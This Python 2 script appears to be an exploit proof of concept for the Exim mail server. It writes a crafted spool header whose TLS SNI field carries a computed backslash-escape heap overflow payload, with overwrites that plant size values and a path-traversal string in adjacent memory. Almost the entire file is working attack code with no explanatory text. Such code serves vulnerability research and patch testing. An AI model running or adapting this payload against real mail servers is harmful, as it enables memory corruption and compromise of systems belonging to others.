#!/usr/bin/env python2
import logging
import math
import struct
import sys

class Fix:
    def __init__(self, offset, value, length):
        self.offset = offset  # Real offset starting from original buffer
        self.ioffset = None  # Offset of fix starting from self.iteration
        self.poffset = None  # Offset of fix in original buffer
        self.value = value
        self.length = length
        self.iteration = None  # Iteration at which this fix will be valid (i.e., not escaped)

    def discarded_size_at_iteration(self, i):
        if i >= self.iteration:
            return 0
        elif i == self.iteration - 1:
            return self.length * 3
        else:
            return ((2 ** (self.iteration - i - 1)) - 2 ** (self.iteration - i - 2)) * self.length

    def has_nul_byte(self):
        has_nul_byte = False
        value = self.value
        for _ in range(self.length):
            byte = value % 256
            value //= 256
            if byte == 0:
                has_nul_byte = True
        return has_nul_byte

    def plength(self):
        if self.iteration == 0:
            return self.length
        else:
            return self.length * 3 + self.length * (2 ** (self.iteration - 1))

    def apply(self, payload):
        str_value = ""
        value = self.value
        for _ in range(self.length):
            byte = value % 256
            value //= 256
            if self.iteration > 0:
                escape = "\\" * (2 ** (self.iteration - 1))
                str_value += escape + "x{0:02x}".format(byte)
            else:
                str_value = chr(byte)
        return payload[:self.poffset] + str_value + payload[self.poffset + len(str_value):]

    def __repr__(self):
        return "Fix(0x{x:x}, 0x{value:x}, {length})".format(x=self.offset, value=self.value, length=self.length)

class Overflow:
    def __init__(self, buflen, fill):
        assert (buflen % 8 == 0)
        self.fill = fill
        self.buflen = buflen
        self.repeat = None
        self.fixes = []

    def fix(self, offset, value, length):
        self.fixes.append(Fix(offset, value, length))

    def spread(self, repeat):
        fixes = sorted(self.fixes, key=lambda fix: fix.offset)
        remaining_fixes = [fix for fix in fixes]
        applied_fixes = []

        current_buflen = self.buflen
        p = 0
        for i in range(repeat):
            p += current_buflen

            for fix in remaining_fixes:
                if fix.offset < p:
                    fix.iteration = i
                    fix.ioffset = fix.offset - (p - current_buflen)
                    applied_fixes.append(fix)
                elif fix.iteration == i:
                    fix.iteration += 1

            remaining_fixes = [fix for fix in fixes if fix.offset > p]
            reduction = sum([fix.discarded_size_at_iteration(i) for fix in remaining_fixes])
            current_buflen -= reduction
            reduction = 0
            if (repeat - i) > 3:
                reduction = 2 ** (repeat - i - 3) - 2 ** (repeat - i - 3 - 1)
            elif (repeat - i) == 3:
                reduction = 1
            current_buflen -= reduction
        return applied_fixes

    def layout(self):
        repeat = 0
        for fix in self.fixes:
            fix.iteration = 0

        applied_fixes = []
        while len(applied_fixes) < len(self.fixes):
            applied_fixes = self.spread(repeat)
            repeat += 1

        self.repeat = repeat - 1

        applied_fixes = self.spread(self.repeat)
        assert (len(applied_fixes) == len(self.fixes))

        last = None
        applied_fixes = []
        for fix in sorted(self.fixes, key=lambda fix: fix.ioffset):
            reduction = sum([sum([applied.discarded_size_at_iteration(i) for i in range(fix.iteration)]) for applied in applied_fixes])
            fix.poffset = fix.ioffset + reduction
            if last is not None and last.poffset + last.plength() > fix.poffset:
                raise ValueError("{0} overlaps on targeted offset of {1}".format(last, fix))
            applied_fixes.append(fix)
            last = fix

        prev = None
        for fix in sorted(self.fixes, key=lambda fix: fix.poffset):
            if prev is not None:
                if prev.has_nul_byte():
                    if fix.iteration > prev.iteration + 1:
                        raise ValueError("Can't reach iteration {0} for {1} because {2} contains nul bytes".format(fix.iteration, fix, prev))
                    elif fix.iteration == prev.iteration + 1 and fix.poffset > prev.poffset:
                        raise ValueError("Can't write {0} because {1} contains nul bytes".format(fix, prev))
            prev = fix

    def payload(self):
        payload = self.fill * int(math.ceil(self.buflen / float(len(self.fill))))
        if self.repeat > 3:
            escape = "\\" * (2 ** (self.repeat - 3)) + "\\"
        elif self.repeat == 3:
            escape = "\\"
        else:
            escape = ""

        payload = payload[:self.buflen - 1 - len(escape)] + escape

        for fix in self.fixes:
            payload = fix.apply(payload)

        return payload

def sni():
    current_block_length = 0x2000
    sni_offset = 0x68
    remaining_space = current_block_length - sni_offset
    original_sni_length = 8 * (remaining_space // 2 // 8)

    overflow = Overflow(original_sni_length, "a")
    overflow.fix(remaining_space + 0x28 + 0x00, 0x0000000000000000, 8)
    overflow.fix(remaining_space + 0x28 + 0x08, 0x0000000000002000, 8)
    overflow.fix(remaining_space + 0x28 + 0x19, 0x2e2e2f2e2e2f2e2e, 8)
    overflow.fix(remaining_space + 0x28 + 0x19 + 0x08, 0x742f2e2e2f2e2e2f, 8)
    overflow.fix(remaining_space + 0x28 + 0x19 + 0x10, 0x0065746f742f706d, 8)

    overflow.layout()
    payload = overflow.payload()

    return payload

def main():
    id = "1i7Jgy-baaaad-Pb"
    sys.stdout.write(id + "-H\n")
    sys.stdout.write("Debian-exim 105 109\n")
    sys.stdout.write("<exim@synacktiv.com>\n")
    sys.stdout.write("1569679277 0\n")
    sys.stdout.write("-received_time_usec .793865\n")
    sys.stdout.write("-helo_name " + "b" * 0x2fd0 + "\n")
    sys.stdout.write("-host_address 192.168.122.1.45170\n")
    sys.stdout.write("-interface_address 192.168.122.244.25\n")
    sys.stdout.write("-received_protocol esmtps\n")
    sys.stdout.write("-body_linecount 3\n")
    sys.stdout.write("-max_received_linelength 25\n")
    sys.stdout.write("-deliver_firsttime\n")
    sys.stdout.write("-host_lookup_failed\n")
    sys.stdout.write("-tls_cipher TLS1.2:ECDHE_RSA_AES_256_GCM_SHA384:256\n")
    sys.stdout.write("-tls_sni " + sni() + "\n")
    sys.stdout.write("-tls_ourcert -----BEGIN CERTIFICATE-----\\nMIIC0jCCAboCCQDswnUq91Uj1zANBgkqhkiG9w0BAQsFADArMQswCQYDVQQGEwJV\\n...\\n-----END CERTIFICATE-----\\n\n")
    sys.stdout.write("XX\n")
    sys.stdout.write("1\n")
    sys.stdout.write("exim@synacktiv.com\n")

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    main()
